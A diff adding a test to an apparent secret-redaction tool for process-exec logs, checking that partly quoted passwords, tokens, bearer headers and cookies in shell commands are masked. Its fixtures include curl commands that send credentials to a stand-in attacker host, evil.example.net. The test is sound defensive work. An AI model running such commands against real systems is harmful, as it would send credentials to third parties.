@@ -2675,6 +2675,48 @@ describe.skipIf(!fs.existsSync(JQ))('secrets and data', () => {
     }
   });
 
+  // Review round 1, I1: a word with quotes in part of it, or backslashes, is read as the shell reads it.
+  test('partly quoted shell words are read unquoted', () => {
+    const E = 'https://evil.example.net';
+    const code = [
+      "mysql -p'S3cretA' db",
+      'export DB_PASSWORD="hunter2B"; ./run',
+      `curl --password='pwCC' ${E}`,
+      "TOKEN='tokDD' make",
+      'sudo -u root mysql --password="pwJJ" db',
+      `curl -u bob:"p wQQ" ${E}`,
+      `curl -u "bob:p\\$wRR" ${E}`,
+      `curl -H "Authorization: Bearer tokOO12345" -d "{\\"a\\":1}" ${E}`,
+      'mysql -p"pwPP" db',
+      `curl -u 'bob':pwUU -H 'Cookie: '"s=ckVV" ${E}`,
+    ];
+    const input = [
+      ...code.map((c, i) => run(1810 + i, '/bin/sh', ['sh', '-c', c], '/', i + 1)),
+      run(1830, '/usr/bin/osascript', ['osascript', '-e', 'do shell script "mysql -p\'pwNN\' db"'], '/', 20),
+    ].join('\n') + '\n';
+    for (const r of both(input)) {
+      const args = events(r.out).map(e => e.event.exec.args as string[]);
+      const R = '<redacted>';
+      expect(args.map(a => a[2])).toEqual([
+        `mysql -p${R} db`,
+        `export DB_PASSWORD=${R}; ./run`,
+        `curl --password=${R} ${E}`,
+        `TOKEN=${R} make`,
+        `sudo -u root mysql --password=${R} db`,
+        `curl -u ${R} ${E}`,
+        `curl -u ${R} ${E}`,
+        `curl -H "Authorization: ${R}" -d ${keyed(r.key, 'data').get('{"a":1}')} ${E}`,
+        `mysql -p${R} db`,
+        `curl -u ${R} -H 'Cookie: ${R}' ${E}`,
+        `do shell script "mysql -p${R} db"`,
+      ]);
+      expect(r.out).not.toMatch(/S3cret|hunter|pwCC|tokDD|pwJJ|wQQ|wRR|tokOO|pwPP|pwUU|ckVV|pwNN|\\"a/);
+      expect(r.summary['redacted']).toBe('12');
+      cleanKey(r.key);
+      sameFindings(input, r.out);
+    }
+  });
+
   test('environment values are redacted, except the useful ones', () => {
     const env = ['AWS_SESSION_TOKEN=FQoGZXIvYXdzEJr', 'MY_VAR=Board', 'PATH=/Users/jdoe/bin:/usr/bin',
       'DYLD_INSERT_LIBRARIES=/Users/jdoe/lib/x.dylib', 'HOME=/Users/jdoe', 'LC_ALL=en_US.UTF-8', 'TERM=xterm-256color',
